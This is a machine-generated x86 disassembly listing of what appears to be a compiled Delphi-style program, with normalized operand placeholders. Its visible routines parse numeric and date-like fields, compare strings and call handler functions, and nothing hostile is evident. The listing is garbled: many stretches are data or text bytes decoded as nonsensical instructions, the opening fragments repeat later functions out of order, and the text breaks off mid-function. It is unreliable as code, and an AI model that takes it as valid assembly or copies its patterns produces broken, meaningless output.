add [ eax - 0x80000000 ] al
sub [ eax ] eax
push es
dec edi
outsb
push eax
outsd
jae r-xdata
jne r-xdata
outsb
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edi + ecx * 2 ] cl
jb r-xdata
mov edx 0x1
call sub_4084c8
mov ebx eax
lea eax [ ebp - 0xc ]
mov ecx 0x2
mov edx 0x1
call sub_4046c4
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404684
mov eax [ ebp - 0x14 ]
mov edx 0x1
call sub_4084c8
mov esi eax
lea eax [ ebp - 0xc ]
mov ecx 0x2
mov edx 0x1
call sub_4046c4
lea eax [ ebp - 0x18 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404684
mov eax [ ebp - 0x18 ]
mov edx 0x1
call sub_4084c8
mov edi eax
lea eax [ ebp - 0xc ]
mov ecx 0x2
mov edx 0x1
call sub_4046c4
push 0x0
mov ecx edi
mov edx esi
mov eax ebx
call sub_409968
fstp [ ebp - 0x8 ]
fwait
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_408250
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0xc ]
call sub_4041fc
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
call sub_408068
mov eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_404570
jne r-xdata
nop
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_477c79
push [ fs : eax ]
xor al 0x73
inc edi
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
outsb
dec ecx
dec eax
popad
jbe r-xdata
add [ eax ] al
sub [ esi ] 0x0
or al 0x4f
jb r-xdata
push [ eax + 0x1 ]
add bh bh
jo r-xdata
js r-xdata
add [ eax ] al
call [ eax ]
movsd [ edi ] [ esi ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002b ] al
jbe r-xdata
cld
jae r-xdata
imul esi [ ebx + 0x74 ] 0x4777654e
jb r-xdata
imul esp [ ebx + 0x6c ] 0x4775ac65
add [ eax ] bh
add [ eax ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477c80
lea eax [ ebp - 0x20 ]
mov edx 0x6
call sub_404188
retn
call sub_46de88
fadd [ ebp - 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x2
mov edx 0x1
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4041fc
mov eax [ ebp - 0xc ]
call sub_404424
test eax eax
jle r-xdata
add [ edi + edi * 8 + 0x30 ] ah
inc ebx
push 0xa06b6365
je r-xdata
imul esp [ ebp + 0x77 ] 0x6d726f46
popad
jb r-xdata
outsb
pop eax
dec eax
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push es
dec edi
dec esi
ja r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002d ] al
outsb
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0900
jne r-xdata
xor ecx ecx
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsd
jne r-xdata
arpl [ edi + eax * 2 + 0x72 ] si
jbe r-xdata
outsb
dec ecx
dec eax
popad
jbe r-xdata
imul esp [ eax - 0x77ffb88c ] 0x1
add bh bh
mov [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] cl
dec edi
add [ eax + 0x1 ] bh
add bh bh
jbe r-xdata
add [ eax + 0x1 ] ah
add bh bh
pushad
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0028 ] al
outsb
push ebx
insb
mov eax [ ebp - 0xc ]
call sub_404684
mov eax [ ebp - 0x10 ]
add [ eax ] al
add [ edx + 0x1 ] bh
push eax
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
add [ eax ] eax
inc [ eax + 0x1ff0001 ]
add [ eax + 0x1 ] dh
je r-xdata
add [ eax + 0x1 ] ch
add bh bh
push 0x1ff0001
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002a ] al
outsb
pop eax
dec edi
jbe r-xdata
sub_477b28
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_477c79
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4041fc
mov eax [ ebp - 0xc ]
call sub_404424
test eax eax
jle r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404684
mov eax [ ebp - 0x10 ]
mov edx 0x1
call sub_4084c8
mov ebx eax
lea eax [ ebp - 0xc ]
mov ecx 0x2
mov edx 0x1
call sub_4046c4
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404684
mov eax [ ebp - 0x14 ]
mov edx 0x1
call sub_4084c8
mov esi eax
lea eax [ ebp - 0xc ]
mov ecx 0x2
mov edx 0x1
call sub_4046c4
lea eax [ ebp - 0x18 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404684
mov eax [ ebp - 0x18 ]
mov edx 0x1
call sub_4084c8
mov edi eax
lea eax [ ebp - 0xc ]
mov ecx 0x2
mov edx 0x1
call sub_4046c4
push 0x0
mov ecx edi
mov edx esi
mov eax ebx
call sub_409968
fstp [ ebp - 0x8 ]
fwait
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_408250
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0xc ]
call sub_4041fc
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
call sub_408068
mov eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_404570
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477c80
lea eax [ ebp - 0x20 ]
mov edx 0x6
call sub_404188
retn
call sub_46de88
fadd [ ebp - 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_477c98
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_477e0b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_4041fc
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
mov cl 0x1
mov edx r-xdata
call sub_46e170
mov eax [ ebp - 0x14 ]
call sub_404424
cmp eax 0x6
jle r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_404684
mov eax [ ebp - 0x1c ]
mov edx 0x45
call sub_4084c8
mov ebx eax
lea eax [ ebp - 0x14 ]
mov ecx 0x2
mov edx 0x1
call sub_4046c4
add bx 0x7d0
lea eax [ ebp - 0x18 ]
push eax
mov ecx 0x4
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_404684
mov eax [ ebp - 0x18 ]
mov edx 0x7b1
call sub_4084c8
mov ebx eax
lea eax [ ebp - 0x14 ]
mov ecx 0x4
mov edx 0x1
call sub_4046c4
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_404684
mov eax [ ebp - 0x20 ]
mov edx 0x1
call sub_4084c8
mov edi eax
lea eax [ ebp - 0x14 ]
mov ecx 0x2
mov edx 0x1
call sub_4046c4
lea eax [ ebp - 0x24 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_404684
mov eax [ ebp - 0x24 ]
mov edx 0x1
call sub_4084c8
mov [ ebp - 0xa ] ax
lea eax [ ebp - 0x14 ]
mov ecx 0x2
mov edx 0x1
call sub_4046c4
mov cx [ ebp - 0xa ]
mov edx edi
mov eax ebx
call sub_409b08
fstp [ ebp - 0x8 ]
fwait
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_477b28
fadd [ ebp - 0x8 ]
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477e12
lea eax [ ebp - 0x24 ]
mov edx 0x6
call sub_404188
retn
sub_477e1f
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_477fc3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x102 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477fca
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404188
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
cmp [ ebx + 0x11a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_47a444
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x74 ]
call sub_404424
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x20 ]
call sub_408250
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404684
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_404570
je r-xdata
mov edx 0x19c
mov eax [ esi + 0x14 ]
call sub_470858
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4084c8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_404164
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebp - 0x8 ]
call sub_404424
test eax eax
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x70 ] 0x0
jne r-xdata
mov edx 0x1ae
mov eax [ esi + 0x14 ]
call sub_470858
cmp [ ebx + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0xc ] eax
mov edx 0x1a4
mov eax [ esi + 0x14 ]
call sub_470858
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_408350
push [ ebp - 0x1c ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_4044e4
mov ecx [ ebp - 0x18 ]
mov edx 0xdc
mov eax [ esi + 0x14 ]
call sub_4708b0
mov eax esi
call sub_4770b0
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
jmp r-xdata
sub_47801a
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47816c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x192 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478173
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
mov eax [ esi + 0x1c ]
mov [ ebp - 0x4 ] eax
push 0x1
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax [ esi + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
mov edx rw-data
mov ecx 0x1
call sub_46e220
dec eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx 0x1
mov eax [ esi + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax 0x78
call sub_4041b8
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x80 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x194 ]
call [ ebx + 0x190 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
dec eax
je r-xdata
mov edx 0x17d
mov eax [ esi + 0x14 ]
call sub_470858
jmp r-xdata
mov ecx r-xdata
mov edx 0x119
mov eax [ esi + 0x14 ]
call sub_4708b0
jmp r-xdata
lea ecx [ ebp - 0x10 ]
mov edx 0x1
mov eax [ esi + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
add eax 0x7c
call sub_4041b8
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x80 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x194 ]
call [ ebx + 0x190 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
jmp r-xdata
mov edx 0x1e2
mov eax [ esi + 0x14 ]
call sub_470858
mov ecx r-xdata
mov edx 0x119
mov eax [ esi + 0x14 ]
call sub_4708b0
jmp r-xdata
sub_47817f
dec [ eax ]
add [ eax ] al
add [ ecx + 0x63 ] al
arpl [ ebp + 0x70 ] sp
je r-xdata
jne r-xdata
add [ fs : eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47832b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x102 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x20 ]
call sub_408250
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404684
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_404570
je r-xdata
mov edx 0x19c
mov eax [ esi + 0x14 ]
call sub_470858
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478332
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404188
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
cmp [ ebx + 0x11a ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4084c8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_47a444
test al al
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_404164
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebp - 0x8 ]
call sub_404424
test eax eax
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x70 ] 0x0
jne r-xdata
mov eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x74 ]
call sub_404424
test eax eax
mov edx 0x1ae
mov eax [ esi + 0x14 ]
call sub_470858
cmp [ ebx + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0xc ] eax
mov edx 0x1a4
mov eax [ esi + 0x14 ]
call sub_470858
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_408350
push [ ebp - 0x1c ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_4044e4
mov ecx [ ebp - 0x18 ]
mov edx 0xdc
mov eax [ esi + 0x14 ]
call sub_4708b0
mov eax esi
call sub_4770b0
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
sub_4784f3
dec [ ebx ]
add [ eax ] al
add [ 0x64252064 ] ah
and [ 0x73252064 ] ah
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47869f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x102 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4786a6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404188
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
cmp [ ebx + 0x11a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_47a444
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x74 ]
call sub_404424
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x20 ]
call sub_408250
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404684
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_404570
je r-xdata
mov edx 0x19c
mov eax [ esi + 0x14 ]
call sub_470858
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4084c8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_404164
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebp - 0x8 ]
call sub_404424
test eax eax
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x70 ] 0x0
jne r-xdata
mov edx 0x1ae
mov eax [ esi + 0x14 ]
call sub_470858
cmp [ ebx + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0xc ] eax
mov edx 0x1a4
mov eax [ esi + 0x14 ]
call sub_470858
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_408350
push [ ebp - 0x1c ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_4044e4
mov ecx [ ebp - 0x18 ]
mov edx 0xdc
mov eax [ esi + 0x14 ]
call sub_4708b0
mov eax esi
call sub_4770b0
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
sub_4786ee
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478807
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x182 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47880e
mov edx esi
mov eax ebx
call sub_47a444
test al al
jne r-xdata
mov edi [ esi + 0x1c ]
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x20 ]
call sub_408250
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404684
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404570
jne r-xdata
mov al [ ebp - 0x5 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov edx 0x1b3
mov eax [ esi + 0x14 ]
call sub_470858
mov ecx r-xdata
mov edx 0x14f
mov eax [ esi + 0x14 ]
call sub_4708b0
mov eax esi
call sub_4770b0
lea eax [ ebp - 0xc ]
call sub_404164
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x5 ]
mov edx [ esi + 0x1c ]
mov eax [ ebx + 0x15c ]
call [ ebx + 0x158 ]
mov ecx 0x1b4
mov edx 0xeb
mov al [ ebp - 0x5 ]
call sub_46e39c
mov edx eax
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_4708b0
jmp r-xdata
sub_47884d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47891f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x132 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478926
mov edx esi
mov eax ebx
call sub_47a444
test al al
jne r-xdata
mov edi [ esi + 0x1c ]
mov edx esi
mov eax ebx
call sub_47a444
test al al
jne r-xdata
mov eax [ edi + 0x70 ]
mov [ ebp - 0x4 ] eax
push [ ebx + 0x134 ]
push [ ebx + 0x130 ]
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_47a478
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx 0x1ae
mov eax [ esi + 0x14 ]
call sub_470858
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_408350
push [ ebp - 0x10 ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0x4
call sub_4044e4
mov ecx [ ebp - 0xc ]
mov edx 0xdf
mov eax [ esi + 0x14 ]
call sub_4708b0
jmp r-xdata
sub_478971
add [ eax ] al
add [ ebx + 0x56 ] dl
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_47a444
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4770b0
mov edx [ ebx + 0x1c ]
mov eax esi
call sub_479774
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
sub_4789af
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478ab6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478abd
lea eax [ ebp - 0x8 ]
call sub_404164
retn
cmp [ ebx + 0x142 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_47a444
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ esi + 0x20 ]
call sub_408250
mov eax [ ebp - 0x8 ]
call sub_404424
test eax eax
jle r-xdata
lea eax [ ebp - 0xd ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x74 ]
call sub_4041fc
mov ecx r-xdata
mov edx 0x19c
mov eax [ esi + 0x14 ]
call sub_4708b0
mov eax [ ebp - 0x4 ]
add eax 0x74
mov edx [ ebp - 0x8 ]
call sub_4041b8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x70 ] edx
mov eax esi
call sub_4770b0
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
sub_478b0c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_478c5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
call sub_47a444
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478c62
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_404188
retn
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
cmp [ esi + 0x152 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_404164
lea ecx [ ebp - 0x10 ]
xor edx edx
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_477c98
fstp [ ebp - 0x8 ]
fwait
lea ecx [ ebp - 0x14 ]
mov edx 0x1
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_477b28
fadd [ ebp - 0x8 ]
fstp [ ebp - 0x8 ]
fwait
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax 0x2
jle r-xdata
mov eax ebx
call sub_4770b0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebx + 0x1c ]
mov eax [ esi + 0x154 ]
call [ esi + 0x150 ]
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea ecx [ ebp - 0x1c ]
mov edx 0x2
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_408068
mov eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_404570
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx 0x2
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
call sub_46de88
fadd [ ebp - 0x8 ]
fstp [ ebp - 0x8 ]
fwait
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax 0x3
jle r-xdata
lea ecx [ ebp - 0xc ]
mov edx 0x3
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
jmp r-xdata
sub_478c7b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_478dea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
call sub_47a444
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478df1
lea eax [ ebp - 0x20 ]
mov edx 0x6
call sub_404188
retn
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax 0x3
jle r-xdata
cmp [ esi + 0x17a ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_404164
lea ecx [ ebp - 0x10 ]
mov edx 0x1
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_477c98
fstp [ ebp - 0x8 ]
fwait
lea ecx [ ebp - 0x14 ]
mov edx 0x2
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_477b28
fadd [ ebp - 0x8 ]
fstp [ ebp - 0x8 ]
fwait
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax 0x4
jle r-xdata
mov eax ebx
call sub_4770b0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
